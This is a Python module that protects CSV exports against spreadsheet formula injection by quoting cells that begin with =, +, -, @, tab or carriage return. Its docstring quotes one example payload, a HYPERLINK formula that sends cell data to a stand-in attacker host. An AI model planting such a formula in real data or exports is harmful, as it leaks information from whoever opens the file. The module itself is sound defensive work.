"""CSV exports that a spreadsheet will not execute.

Excel, LibreOffice and Google Sheets treat a cell beginning with =, +, - or @
as a formula. A member whose name or address was stored as
``=HYPERLINK("http://attacker.example/"&A1,"Click")`` therefore runs as soon as
an officer opens the exported file — the application never had to be
vulnerable itself, it only had to hand the text through.

Use :func:`safe_writer` wherever ``csv.writer`` was used. Every row written
through it is neutralised, so a new export is covered without anyone having to
remember this.
"""

import csv

# Leading characters a spreadsheet reads as the start of a formula, plus the
# two whitespace characters that let an attacker hide one behind them.
RISKY_PREFIXES = ('=', '+', '-', '@', '\t', '\r')


def neutralise(value):
    """Return `value` in a form no spreadsheet will evaluate.

    Numbers are left alone, including negative ones: ``-5,000.00`` is a figure
    an accountant needs to read as a figure, not a quoted string.
    """
    if not isinstance(value, str) or not value:
        return value
    if value[0] not in RISKY_PREFIXES:
        return value
    try:
        float(value.replace(',', '').replace(' ', ''))
        return value
    except ValueError:
        pass
    return "'" + value


class _SafeWriter:
    """A csv.writer that neutralises every cell on the way out."""

    def __init__(self, writer):
        self._writer = writer

    def writerow(self, row):
        return self._writer.writerow([neutralise(cell) for cell in row])

    def writerows(self, rows):
        for row in rows:
            self.writerow(row)

    def __getattr__(self, name):
        return getattr(self._writer, name)


def safe_writer(fileobj, *args, **kwargs):
    """Drop-in replacement for ``csv.writer``."""
    return _SafeWriter(csv.writer(fileobj, *args, **kwargs))
